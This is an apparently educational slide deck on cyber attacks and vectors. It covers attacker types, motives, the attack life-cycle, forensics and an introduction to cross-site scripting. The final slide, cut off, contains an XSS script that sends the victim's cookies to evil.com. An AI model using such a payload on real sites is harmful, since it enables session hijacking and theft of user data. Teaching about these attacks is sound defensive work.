---
marp: true
theme: default
paginate: true
_paginate: false

<!--
https://pentest-tools.com/blog/sql-injection-attacks
-->
---

# Cyber Attacks and Vectors
### Mark Veltzer
#### Senior Software Engineer

---
# Hacking Landscape Overview

---

## Who are the hackers?

- Script kiddies
- Hacktivists
- Cyber criminals
- State-sponsored actors
- Insiders

---

## What are the hackers' motivations?

- Financial gain
- Political or ideological beliefs
- Cyber warfare
- Intellectual challenge
- Revenge

---

## What are the hackers' goals?

- Data theft
- System disruption
- Cyber espionage
- Reputation damage
- Financial fraud

---

## What are the hackers' targets?

- Governments
- Corporations
- Critical infrastructure
- Financial institutions
- Individual users

---
## Attack Life-cycle

1. Reconnaissance
2. Weaponization
3. Delivery
4. Exploitation
5. Installation
6. Command & Control
7. Actions on Objectives

---

## Forensics Introduction

- Collecting and analyzing digital evidence
- Identifying the attack vector
- Determining the scope and impact
- Remediating and hardening systems
- Preparing for legal proceedings

---

<!-- _class: lead -->
# Cross-Site Scripting (XSS)

---

## What is XSS?

- A type of web application vulnerability
- Allows attacker to inject malicious scripts
- Scripts execute in the victim's browser
- Can lead to session hijacking, data theft, and more

---

## Types of XSS

### Reflected XSS
- Payload is part of the request
- Reflected back in the response
- Typically occurs in search fields, error messages

### Stored XSS
- Payload is stored on the server
- Displayed to other users
- Common in user forums, comment sections

### DOM-Based XSS
- Payload never sent to the server
- Executed by modifying the DOM environment

---

## XSS Attack Examples

### Stealing Cookies
```html
<script>
  document.location='http://evil.com/steal?cookie='+document.cookie
</script>
